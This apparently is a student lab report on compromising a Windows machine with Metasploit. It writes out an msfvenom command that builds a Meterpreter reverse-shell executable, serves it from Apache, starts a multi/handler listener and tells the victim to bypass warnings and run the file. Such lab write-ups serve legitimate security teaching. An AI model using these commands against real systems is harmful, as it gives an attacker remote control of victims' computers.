# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

![image](https://github.com/user-attachments/assets/b4fed159-5971-41f2-b1bf-c6eb03319f44)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:

![image](https://github.com/user-attachments/assets/11ef69be-b46b-4214-b2c9-c4ca96f9edae)

copy the fun.exe into the apache /var/www/html folder

## OUTPUT:

![image](https://github.com/user-attachments/assets/f54131ee-bc01-4fd2-89a6-d6e54ee82b5d)

Check the status of apache2

## OUTPUT:

![image](https://github.com/user-attachments/assets/932472df-eec9-41e9-9dd1-746a58e3fb34)

Invoke msfconsole:

## OUTPUT:

![image](https://github.com/user-attachments/assets/d44f4801-82e5-4729-a5da-5e71bc3f0d00)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![image](https://github.com/user-attachments/assets/e5877fb1-8005-47fa-9b17-050330047cde)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/user-attachments/assets/78b39412-cbf4-4bfc-a629-0d7efa9b6328)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/user-attachments/assets/addfb2a1-0df1-4b75-b0de-03c7c586de43)

Bypass any warning boxes, double-click the file, and allow it to run.

![image](https://github.com/user-attachments/assets/8bd954e5-dd06-4212-821a-8c6631c2cc36)

On kali give the command exploit

![image](https://github.com/user-attachments/assets/d77517be-742e-4a67-9175-58b419f931f9)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/user-attachments/assets/529d7e7b-bfc9-469d-b281-1686ae158b79)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
